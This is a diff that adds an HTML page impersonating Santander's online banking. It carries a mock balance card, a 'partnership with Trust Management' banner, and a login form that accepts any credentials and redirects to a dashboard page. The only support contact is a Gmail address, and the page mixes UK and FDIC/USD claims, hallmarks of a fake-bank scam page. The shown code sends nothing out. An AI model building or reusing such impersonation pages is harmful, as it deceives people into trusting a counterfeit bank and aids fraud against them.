@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Santander · Trusted Online Banking</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:opsz,wght@8..60,400;8..60,600;8..60,700&family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    /* ----- reset & base ----- */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #0a0e1a;
+      color: #e8edf5;
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    .serif { font-family: 'Source Serif 4', serif; }
+    .mono { font-family: 'JetBrains Mono', monospace; font-variant-numeric: tabular-nums; }
+    a { color: inherit; text-decoration: none; }
+    button { font-family: inherit; cursor: pointer; }
+    .container { max-width: 1280px; margin: 0 auto; padding: 0 24px; width: 100%; }
+
+    /* ----- background animation ----- */
+    .bg-glow { position: fixed; inset: 0; z-index: -1; overflow: hidden; pointer-events: none; }
+    .bg-glow::before, .bg-glow::after {
+      content: ''; position: absolute; border-radius: 50%;
+      filter: blur(120px); opacity: 0.25;
+      animation: float 20s ease-in-out infinite;
+    }
+    .bg-glow::before { width: 600px; height: 600px; background: #ec0000; top: -200px; right: -100px; }
+    .bg-glow::after { width: 500px; height: 500px; background: #b30000; bottom: -200px; left: -100px; animation-delay: -10s; }
+    @keyframes float { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(40px, 40px); } }
+
+    /* ----- top bar ----- */
+    .top-bar {
+      background: rgba(15, 26, 47, 0.5);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+      padding: 10px 0; font-size: 12px; color: #7a8aa8;
+      backdrop-filter: blur(12px);
+    }
+    .top-bar .container { display: flex; justify-content: flex-end; gap: 24px; }
+    .top-bar a { display: flex; align-items: center; gap: 6px; transition: color 0.2s; font-weight: 500; }
+    .top-bar a:hover { color: #ec0000; }
+    .top-bar i { font-size: 11px; }
+
+    /* ----- main header ----- */
+    .main-header {
+      background: rgba(10, 14, 26, 0.75);
+      backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+      position: sticky; top: 0; z-index: 100;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+    }
+    .header-inner {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 16px 0; gap: 12px;
+    }
+    .logo-area { display: flex; align-items: center; gap: 12px; }
+    .logo-mark {
+      width: 40px; height: 40px; background: linear-gradient(135deg, #ec0000, #b30000);
+      border-radius: 12px; display: flex; align-items: center; justify-content: center;
+      font-weight: 800; font-size: 18px; color: #fff;
+      box-shadow: 0 4px 20px rgba(236, 0, 0, 0.3);
+    }
+    .brand-name { font-family: 'Source Serif 4', serif; font-weight: 700; font-size: 20px; letter-spacing: -0.3px; color: #fff; }
+    .brand-tag { font-size: 9px; letter-spacing: 2.5px; color: #7a8aa8; font-weight: 600; display: block; margin-top: 1px; }
+
+    .header-right { display: flex; align-items: center; gap: 12px; position: relative; }
+    
+    .menu-btn {
+      width: 44px; height: 44px; border-radius: 12px;
+      background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);
+      display: flex; align-items: center; justify-content: center;
+      color: #e8edf5; font-size: 18px; transition: all 0.25s;
+    }
+    .menu-btn:hover { background: rgba(236,0,0,0.1); border-color: rgba(236,0,0,0.3); color: #ec0000; }
+
+    /* Dropdown menu */
+    .nav-dropdown {
+      position: absolute; top: calc(100% + 12px); right: 0;
+      background: rgba(15, 26, 47, 0.95); backdrop-filter: blur(20px);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 16px; padding: 12px; min-width: 240px;
+      box-shadow: 0 24px 60px rgba(0,0,0,0.6);
+      opacity: 0; visibility: hidden; transform: translateY(-8px);
+      transition: all 0.25s ease; z-index: 200;
+    }
+    .nav-dropdown.open { opacity: 1; visibility: visible; transform: translateY(0); }
+    .nav-dropdown a {
+      display: flex; align-items: center; gap: 12px;
+      padding: 12px 14px; border-radius: 10px;
+      font-size: 14px; font-weight: 500; color: #a0b0c8;
+      transition: all 0.2s;
+    }
+    .nav-dropdown a i { width: 18px; font-size: 14px; color: #5a6a8a; transition: color 0.2s; }
+    .nav-dropdown a:hover { background: rgba(236,0,0,0.1); color: #fff; }
+    .nav-dropdown a:hover i { color: #ec0000; }
+    .nav-divider { height: 1px; background: rgba(255,255,255,0.06); margin: 8px 0; }
+
+    .btn-outline {
+      background: transparent; border: 1px solid rgba(255, 255, 255, 0.1);
+      color: #e8edf5; padding: 11px 24px; border-radius: 40px;
+      font-weight: 600; font-size: 14px; transition: all 0.25s;
+      display: inline-flex; align-items: center; gap: 8px;
+    }
+    .btn-outline:hover { background: rgba(236, 0, 0, 0.1); border-color: #ec0000; color: #ec0000; }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #ec0000, #b30000);
+      color: #fff; border: none; padding: 12px 28px; border-radius: 40px;
+      font-weight: 700; font-size: 14px; transition: all 0.25s ease;
+      box-shadow: 0 4px 20px rgba(236, 0, 0, 0.25);
+      display: inline-flex; align-items: center; gap: 8px;
+    }
+    .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 32px rgba(236, 0, 0, 0.4); }
+
+    /* ----- hero section ----- */
+    .hero { padding: 80px 0 100px; position: relative; overflow: hidden; }
+    .hero .container { display: flex; align-items: center; gap: 60px; flex-wrap: wrap; }
+    .hero-content { flex: 1 1 420px; min-width: 0; }
+    .hero-badge {
+      background: rgba(236, 0, 0, 0.1); color: #ff6b6b;
+      font-weight: 600; font-size: 11px; padding: 8px 16px; border-radius: 30px;
+      display: inline-flex; align-items: center; gap: 8px; margin-bottom: 28px;
+      border: 1px solid rgba(236, 0, 0, 0.2); letter-spacing: 1px; text-transform: uppercase;
+    }
+    .hero-badge i { font-size: 10px; color: #ec0000; }
+    .hero-content h1 {
+      font-family: 'Source Serif 4', serif; font-size: 58px; font-weight: 700;
+      color: #fff; line-height: 1.05; letter-spacing: -1.5px; margin-bottom: 24px;
+    }
+    .hero-content h1 span { 
+      background: linear-gradient(135deg, #ec0000, #ff4444);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .hero-content p { font-size: 17px; color: #94a3b8; margin-bottom: 36px; max-width: 520px; line-height: 1.7; }
+    .hero-buttons { display: flex; gap: 16px; flex-wrap: wrap; align-items: center; }
+    .hero-stats { display: flex; gap: 40px; margin-top: 48px; flex-wrap: wrap; }
+    .stat-item .num { font-family: 'Source Serif 4', serif; font-size: 26px; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
+    .stat-item .label { font-size: 12px; color: #7a8aa8; margin-top: 4px; letter-spacing: 0.3px; }
+
+    .hero-image { flex: 1 1 380px; display: flex; justify-content: center; min-width: 0; position: relative; }
+    .card-glow {
+      position: absolute; inset: -20px; border-radius: 40px;
+      background: radial-gradient(circle, rgba(236, 0, 0, 0.15), transparent 70%);
+      filter: blur(40px); z-index: -1;
+    }
+    .mockup-card {
+      background: rgba(15, 26, 47, 0.8); backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 24px;
+      padding: 30px 32px; width: 100%; max-width: 400px;
+      box-shadow: 0 32px 80px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      transition: transform 0.4s ease, border-color 0.3s;
+    }
+    .mockup-card:hover { transform: translateY(-8px); border-color: rgba(236, 0, 0, 0.3); }
+    .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
+    .card-header .logo-small {
+      background: linear-gradient(135deg, #ec0000, #b30000); color: white; padding: 6px 14px;
+      border-radius: 8px; font-weight: 800; font-size: 15px;
+      box-shadow: 0 2px 12px rgba(236, 0, 0, 0.3);
+    }
+    .card-balance { font-size: 11px; color: #7a8aa8; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1.2px; font-weight: 600; }
+    .card-amount { font-size: 36px; font-weight: 700; letter-spacing: -1px; margin-bottom: 28px; color: #fff; }
+    .card-amount small { font-size: 16px; font-weight: 500; color: #7a8aa8; margin-left: 4px; }
+    .card-row { display: flex; justify-content: space-between; padding: 14px 0; border-top: 1px solid rgba(255,255,255,0.05); font-size: 14px; }
+    .card-row .label { color: #94a3b8; }
+    .card-row .value { font-weight: 600; color: #fff; }
+    .card-chip { display: flex; gap: 10px; margin-top: 20px; }
+    .chip { background: rgba(255,255,255,0.04); padding: 8px 18px; border-radius: 40px; font-size: 12px; font-weight: 600; color: #94a3b8; border: 1px solid rgba(255,255,255,0.06); }
+    .chip.active { background: rgba(236,0,0,0.15); color: #ff6b6b; border-color: rgba(236,0,0,0.25); }
+
+    /* ----- services ----- */
+    .services { padding: 100px 0; background: rgba(15, 26, 47, 0.4); position: relative; }
+    .section-eyebrow { font-size: 12px; color: #ec0000; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 12px; }
+    .section-title { font-family: 'Source Serif 4', serif; font-size: 40px; font-weight: 700; margin-bottom: 16px; color: #fff; letter-spacing: -0.8px; line-height: 1.15; }
+    .section-title span { color: #ec0000; }
+    .section-sub { font-size: 16px; color: #94a3b8; max-width: 600px; margin-bottom: 56px; line-height: 1.6; }
+    .services-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 24px; }
+    .service-card {
+      background: rgba(15, 26, 47, 0.6); backdrop-filter: blur(12px);
+      border-radius: 20px; padding: 32px 28px; border: 1px solid rgba(255,255,255,0.05);
+      transition: all 0.35s ease; position: relative; overflow: hidden;
+    }
+    .service-card::before {
+      content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
+      background: linear-gradient(90deg, #ec0000, transparent);
+      opacity: 0; transition: opacity 0.35s;
+    }
+    .service-card:hover { 
+      transform: translateY(-6px); 
+      background: rgba(15, 26, 47, 0.8); 
+      border-color: rgba(236,0,0,0.15);
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+    }
+    .service-card:hover::before { opacity: 1; }
+    .service-icon {
+      background: rgba(236, 0, 0, 0.1); width: 52px; height: 52px; border-radius: 14px;
+      display: flex; align-items: center; justify-content: center; margin-bottom: 24px;
+      font-size: 22px; color: #ec0000; border: 1px solid rgba(236, 0, 0, 0.15);
+    }
+    .service-card h3 { font-size: 17px; font-weight: 700; margin-bottom: 10px; color: #fff; }
+    .service-card p { font-size: 14px; color: #94a3b8; line-height: 1.6; }
+
+    /* ----- partnership banner ----- */
+    .partnership-banner {
+      padding: 80px 0;
+      background: linear-gradient(135deg, rgba(15, 26, 47, 0.9), rgba(236, 0, 0, 0.08));
+      border-top: 1px solid rgba(255,255,255,0.04);
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+      position: relative; overflow: hidden;
+    }
+    .partnership-banner::before {
+      content: ''; position: absolute; top: -50%; right: -10%;
+      width: 500px; height: 500px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(236, 0, 0, 0.15), transparent 60%);
+      filter: blur(60px); pointer-events: none;
+    }
+    .partnership-inner { position: relative; z-index: 1; max-width: 800px; }
+    .partnership-tag {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: rgba(236, 0, 0, 0.15); color: #ff6b6b;
+      font-weight: 700; font-size: 11px; letter-spacing: 1.5px;
+      padding: 8px 16px; border-radius: 30px; margin-bottom: 24px;
+      text-transform: uppercase; border: 1px solid rgba(236, 0, 0, 0.25);
+    }
+    .partnership-tag i { font-size: 10px; }
+    .partnership-content h2 { font-family: 'Source Serif 4', serif; font-size: 44px; font-weight: 700; line-height: 1.15; margin-bottom: 20px; color: #fff; letter-spacing: -1px; }
+    .partnership-content h2 span { color: #ec0000; }
+    .partnership-content p { font-size: 17px; color: #94a3b8; max-width: 640px; line-height: 1.7; }
+
+    /* ----- login ----- */
+    .login-section { padding: 100px 0; background: #0a0e1a; }
+    .login-wrapper {
+      max-width: 440px; margin: 0 auto; background: rgba(15, 26, 47, 0.6);
+      backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.06);
+      border-radius: 28px; padding: 44px 40px; 
+      box-shadow: 0 32px 100px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.05);
+      position: relative;
+    }
+    .login-secure-badge {
+      position: absolute; top: -14px; left: 50%; transform: translateX(-50%);
+      background: linear-gradient(135deg, #ec0000, #b30000); color: #fff;
+      padding: 6px 18px; border-radius: 40px; font-size: 11px; font-weight: 700;
+      letter-spacing: 1px; text-transform: uppercase;
+      display: inline-flex; align-items: center; gap: 6px;
+      box-shadow: 0 4px 20px rgba(236, 0, 0, 0.4);
+      white-space: nowrap;
+    }
+    .login-wrapper h2 { font-family: 'Source Serif 4', serif; font-size: 30px; font-weight: 700; margin-bottom: 8px; color: #fff; text-align: center; }
+    .login-wrapper h2 span { color: #ec0000; }
+    .login-subtext { font-size: 14px; color: #7a8aa8; margin-bottom: 32px; text-align: center; line-height: 1.5; }
+    .form-group { margin-bottom: 20px; }
+    .login-form label { display: block; font-size: 11px; font-weight: 600; margin-bottom: 8px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.8px; }
+    .input-wrap { position: relative; }
+    .input-wrap i.left-icon {
+      position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
+      color: #5a6a8a; font-size: 14px; transition: color 0.25s;
+    }
+    .input-wrap i.eye {
+      position: absolute; right: 16px; top: 50%; transform: translateY(-50%);
+      color: #5a6a8a; font-size: 14px; cursor: pointer; transition: color 0.25s;
+    }
+    .input-wrap i.eye:hover { color: #ec0000; }
+    .login-form input {
+      width: 100%; padding: 14px 44px; border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 12px; font-size: 14px; font-family: inherit;
+      background: rgba(255,255,255,0.02); color: #e8edf5; outline: none; transition: all 0.25s;
+    }
+    .login-form input:focus { border-color: rgba(236,0,0,0.5); background: rgba(255,255,255,0.04); box-shadow: 0 0 0 3px rgba(236,0,0,0.08); }
+    .login-form input:focus ~ i.left-icon, .input-wrap:focus-within i.left-icon { color: #ec0000; }
+    .login-form button {
+      width: 100%; padding: 16px; background: linear-gradient(135deg, #ec0000, #b30000);
+      color: white; border: none; border-radius: 12px; font-size: 15px;
+      font-weight: 700; transition: all 0.25s; margin-top: 8px;
+      box-shadow: 0 6px 24px rgba(236,0,0,0.3);
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .login-form button:hover { transform: translateY(-2px); box-shadow: 0 10px 40px rgba(236,0,0,0.45); }
+    .login-form button:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+    .login-footer { margin-top: 24px; text-align: center; font-size: 12px; color: #5a6a8a; }
+    .login-footer a { color: #ec0000; font-weight: 600; }
+    .login-footer a:hover { text-decoration: underline; }
+    .login-message {
+      margin-top: 20px; padding: 14px 16px; border-radius: 12px;
+      font-size: 13px; font-weight: 500; display: none; text-align: center;
+    }
+    .login-message.success { display: block; background: rgba(52,211,153,0.08); color: #34d399; border: 1px solid rgba(52,211,153,0.15); }
+    .login-message.error { display: block; background: rgba(236,0,0,0.08); color: #fb7185; border: 1px solid rgba(236,0,0,0.15); }
+
+    /* ----- security ----- */
+    .security { padding: 60px 0; border-top: 1px solid rgba(255,255,255,0.04); background: rgba(15,26,47,0.3); }
+    .security-inner { display: grid; grid-template-columns: repeat(4, 1fr); gap: 32px; }
+    .security-item { display: flex; align-items: center; gap: 14px; font-size: 13px; color: #94a3b8; }
+    .security-item i { font-size: 20px; color: #ec0000; }
+
+    /* ----- footer ----- */
+    .footer { background: #0a0e1a; color: #7a8aa8; padding: 64px 0 32px; font-size: 13px; border-top: 1px solid rgba(255,255,255,0.04); }
+    .footer-simple { display: flex; flex-direction: column; align-items: center; gap: 20px; text-align: center; margin-bottom: 48px; }
+    .footer-logo { display: flex; align-items: center; gap: 12px; margin-bottom: 8px; }
+    .footer-email {
+      display: flex; align-items: center; gap: 12px; font-size: 15px;
+      background: rgba(255,255,255,0.03); padding: 14px 28px; border-radius: 60px;
+      border: 1px solid rgba(255,255,255,0.06); transition: border-color 0.2s;
+    }
+    .footer-email:hover { border-color: rgba(236,0,0,0.3); }
+    .footer-email i { color: #ec0000; font-size: 18px; }
+    .footer-email a { color: #fff; font-weight: 500; }
+    .footer-email a:hover { text-decoration: underline; }
+    .footer-bottom { 
+      border-top: 1px solid rgba(255,255,255,0.04); padding-top: 28px;
+      display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;
+      gap: 16px; font-size: 12px; color: #5a6a8a;
+    }
+    .footer-bottom-links { display: flex; gap: 24px; }
+    .footer-bottom-links a:hover { color: #ec0000; }
+
+    /* ----- responsive ----- */
+    @media (max-width: 1024px) {
+      .hero-content h1 { font-size: 44px; }
+      .services-grid { grid-template-columns: repeat(2, 1fr); }
+      .partnership-content h2 { font-size: 36px; }
+      .security-inner { grid-template-columns: repeat(2, 1fr); }
+      .section-title { font-size: 34px; }
+    }
+    @media (max-width: 768px) {
+      .hero { padding: 60px 0 80px; }
+      .hero .container { flex-direction: column; gap: 48px; }
+      .hero-content { text-align: center; }
+      .hero-content p { margin-left: auto; margin-right: auto; }
+      .hero-buttons { justify-content: center; }
+      .hero-stats { justify-content: center; }
+      .partnership-inner { text-align: center; margin: 0 auto; }
+      .partnership-content h2 { font-size: 30px; }
+      .login-wrapper { padding: 36px 28px; }
+      .footer-bottom { flex-direction: column; text-align: center; }
+    }
+    @media (max-width: 480px) {
+      .container { padding: 0 16px; }
+      .brand-name { font-size: 18px; }
+      .btn-outline { padding: 9px 18px; font-size: 13px; }
+      .hero-content h1 { font-size: 34px; letter-spacing: -0.8px; }
+      .hero-content p { font-size: 15px; }
+      .hero-stats { gap: 28px; }
+      .stat-item .num { font-size: 22px; }
+      .mockup-card { padding: 24px 22px; }
+      .card-amount { font-size: 30px; }
+      .services-grid { grid-template-columns: 1fr; }
+      .section-title { font-size: 28px; }
+      .section-sub { font-size: 14px; }
+      .partnership-content h2 { font-size: 26px; }
+      .login-wrapper { padding: 32px 24px; }
+      .login-wrapper h2 { font-size: 26px; }
+      .security-inner { grid-template-columns: 1fr; }
+      .footer-email { font-size: 12px; padding: 12px 20px; }
+      .footer-bottom-links { flex-wrap: wrap; justify-content: center; gap: 12px; }
+      .nav-dropdown { right: -12px; min-width: 220px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="bg-glow"></div>
+
+  <!-- Top bar -->
+  <div class="top-bar">
+    <div class="container">
+      <a href="#hero"><i class="fas fa-university"></i> Personal</a>
+      <a href="#services"><i class="fas fa-briefcase"></i> Business</a>
+      <a href="#partnership"><i class="fas fa-globe"></i> English</a>
+    </div>
+  </div>
+
+  <!-- Main header -->
+  <header class="main-header">
+    <div class="container">
+      <div class="header-inner">
+        <div class="logo-area">
+          <div class="logo-mark">S</div>
+          <div>
+            <div class="brand-name">Santander</div>
+            <span class="brand-tag">TRUSTED ONLINE BANKING</span>
+          </div>
+        </div>
+        <div class="header-right">
+          <!-- ✅ Hamburger menu button -->
+          <button class="menu-btn" id="menuBtn" aria-label="Open menu">
+            <i class="fas fa-bars"></i>
+          </button>
+          <!-- ✅ Dropdown menu -->
+          <div class="nav-dropdown" id="navDropdown">
+            <a href="#services"><i class="fas fa-wallet"></i> Accounts</a>
+            <a href="#services"><i class="fas fa-credit-card"></i> Cards</a>
+            <a href="#services"><i class="fas fa-mobile-alt"></i> Payments</a>
+            <a href="#services"><i class="fas fa-piggy-bank"></i> Savings</a>
+            <div class="nav-divider"></div>
+            <a href="#help"><i class="fas fa-headset"></i> Support</a>
+            <a href="#login"><i class="fas fa-sign-in-alt"></i> Log in</a>
+          </div>
+          <a href="#login" class="btn-outline">Log in</a>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Hero section -->
+  <section class="hero" id="hero">
+    <div class="container">
+      <div class="hero-content">
+        <div class="hero-badge"><i class="fas fa-shield-alt"></i> Bank with confidence</div>
+        <h1 class="serif">Your future <br><span>starts with us.</span></h1>
+        <p>Smart banking for real life — from everyday accounts to mortgages and investments. Experience the security of a global institution with the ease of a modern digital bank.</p>
+        <div class="hero-buttons">
+          <a href="#login" class="btn-primary">Open an account <i class="fas fa-arrow-right"></i></a>
+          <a href="#services" class="btn-outline">Explore services</a>
+        </div>
+        <div class="hero-stats">
+          <div class="stat-item"><div class="num">14M+</div><div class="label">UK Customers</div></div>
+          <div class="stat-item"><div class="num">800+</div><div class="label">Branches</div></div>
+          <div class="stat-item"><div class="num">96%</div><div class="label">Customer Trust</div></div>
+        </div>
+      </div>
+      <div class="hero-image">
+        <div class="card-glow"></div>
+        <div class="mockup-card">
+          <div class="card-header">
+            <span class="logo-small">S</span>
+            <i class="fas fa-wifi" style="font-size: 12px; color: #5a6a8a;"></i>
+          </div>
+          <div class="card-balance">Total Portfolio Balance</div>
+          <div class="card-amount mono">$12,480.50 <small>USD</small></div>
+          <div class="card-row">
+            <span class="label">Savings Account</span>
+            <span class="value mono">$8,200.00</span>
+          </div>
+          <div class="card-row">
+            <span class="label">Everyday Account</span>
+            <span class="value mono">$4,280.50</span>
+          </div>
+          <div class="card-chip">
+            <span class="chip active">Send</span>
+            <span class="chip">Request</span>
+            <span class="chip">Top up</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Services -->
+  <section class="services" id="services">
+    <div class="container">
+      <div class="section-eyebrow">Our Services</div>
+      <h2 class="section-title serif">Everything you need, <span>in one place.</span></h2>
+      <p class="section-sub">From everyday spending to long-term wealth — designed to give you complete control of your financial life.</p>
+      <div class="services-grid">
+        <div class="service-card" id="accounts">
+          <div class="service-icon"><i class="fas fa-wallet"></i></div>
+          <h3>Current Accounts</h3>
+          <p>Fee-free everyday banking with instant notifications and total transparency.</p>
+        </div>
+        <div class="service-card" id="cards">
+          <div class="service-icon"><i class="fas fa-credit-card"></i></div>
+          <h3>Credit & Debit Cards</h3>
+          <p>Flexible limits, cashback rewards, and premium travel benefits.</p>
+        </div>
+        <div class="service-card" id="payments">
+          <div class="service-icon"><i class="fas fa-mobile-alt"></i></div>
+          <h3>Mobile Payments</h3>
+          <p>Send, request, and split bills instantly — right from your phone.</p>
+        </div>
+        <div class="service-card" id="savings">
+          <div class="service-icon"><i class="fas fa-piggy-bank"></i></div>
+          <h3>Savings & Investments</h3>
+          <p>Set goals, build wealth, and grow your money automatically.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Partnership banner -->
+  <section class="partnership-banner" id="partnership">
+    <div class="container">
+      <div class="partnership-inner">
+        <span class="partnership-tag"><i class="fas fa-handshake"></i> Official Partnership</span>
+        <h2 class="serif">We are proud to partner with <span>Trust Management.</span></h2>
+        <p>Santander Online Bank has joined forces with Trust Management to bring you exclusive financial tools, premium support, and smarter ways to manage your money — all in one secure place.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Login section -->
+  <section class="login-section" id="login">
+    <div class="container">
+      <div class="login-wrapper">
+        <div class="login-secure-badge"><i class="fas fa-lock"></i> Secure Login</div>
+        <h2 class="serif">Welcome <span>back.</span></h2>
+        <p class="login-subtext">Log in to your Santander Online Bank account to access your dashboard.</p>
+        <form class="login-form" id="loginForm">
+          <div class="form-group">
+            <label for="username">Username</label>
+            <div class="input-wrap">
+              <input type="text" id="username" name="username" placeholder="Enter your username" autocomplete="username">
+              <i class="fas fa-user left-icon"></i>
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="password">Password</label>
+            <div class="input-wrap">
+              <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password">
+              <i class="fas fa-lock left-icon"></i>
+              <i class="fas fa-eye eye" id="eyeIcon" onclick="togglePassword()"></i>
+            </div>
+          </div>
+          <button type="submit" id="submitBtn">
+            Log in to Dashboard <i class="fas fa-arrow-right"></i>
+          </button>
+          <div class="login-message" id="loginMessage"></div>
+        </form>
+        <div class="login-footer">
+          Need help? Contact <a href="mailto:trutmgtsupport59@gmail.com">support</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Security -->
+  <section class="security" id="help">
+    <div class="container">
+      <div class="security-inner">
+        <div class="security-item"><i class="fas fa-shield-alt"></i><span>FDIC insured up to $250,000</span></div>
+        <div class="security-item"><i class="fas fa-lock"></i><span>256-bit encryption</span></div>
+        <div class="security-item"><i class="fas fa-headset"></i><span>24/7 customer support</span></div>
+        <div class="security-item"><i class="fas fa-mobile-alt"></i><span>Freeze card in app</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-simple">
+        <div class="footer-logo">
+          <div class="logo-mark" style="width:36px;height:36px;font-size:16px;">S</div>
+          <div>
+            <div class="brand-name" style="font-size:18px;">Santander</div>
+            <span class="brand-tag">TRUSTED ONLINE BANKING</span>
+          </div>
+        </div>
+        <p style="max-width:520px; line-height:1.6;">Have a question or need assistance? Our dedicated support team is available to help you 24/7.</p>
+        <div class="footer-email">
+          <i class="fas fa-envelope"></i>
+          <a href="mailto:trutmgtsupport59@gmail.com">trutmgtsupport59@gmail.com</a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <div>© 2025 Santander Online Bank. All rights reserved.</div>
+        <div class="footer-bottom-links">
+          <a href="#">Privacy Policy</a>
+          <a href="#">Terms of Service</a>
+          <a href="#">Security</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // ✅ Toggle password visibility
+    function togglePassword() {
+      const pw = document.getElementById('password');
+      const icon = document.getElementById('eyeIcon');
+      if (pw.type === 'password') {
+        pw.type = 'text';
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+      } else {
+        pw.type = 'password';
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+      }
+    }
+
+    // ✅ Hamburger menu toggle
+    const menuBtn = document.getElementById('menuBtn');
+    const navDropdown = document.getElementById('navDropdown');
+    menuBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      navDropdown.classList.toggle('open');
+    });
+    // Close dropdown when clicking outside
+    document.addEventListener('click', (e) => {
+      if (!navDropdown.contains(e.target) && !menuBtn.contains(e.target)) {
+        navDropdown.classList.remove('open');
+      }
+    });
+    // Close dropdown when a link is clicked
+    navDropdown.querySelectorAll('a').forEach(a => {
+      a.addEventListener('click', () => navDropdown.classList.remove('open'));
+    });
+
+    // ✅ Login form + redirect
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const message = document.getElementById('loginMessage');
+      const btn = document.getElementById('submitBtn');
+
+      if (username !== '' && password !== '') {
+        message.textContent = '✓ Logged in successfully! Redirecting to your dashboard...';
+        message.className = 'login-message success';
+        
+        btn.disabled = true;
+        btn.innerHTML = 'Redirecting... <i class="fas fa-spinner fa-spin"></i>';
+        
+        setTimeout(() => {
+          window.location.href = 'Dashboard.html';
+        }, 900);
+      } else {
+        message.textContent = 'Please enter your username and password to continue.';
+        message.className = 'login-message error';
+      }
+    });
+  </script>
+</body>
+</html>
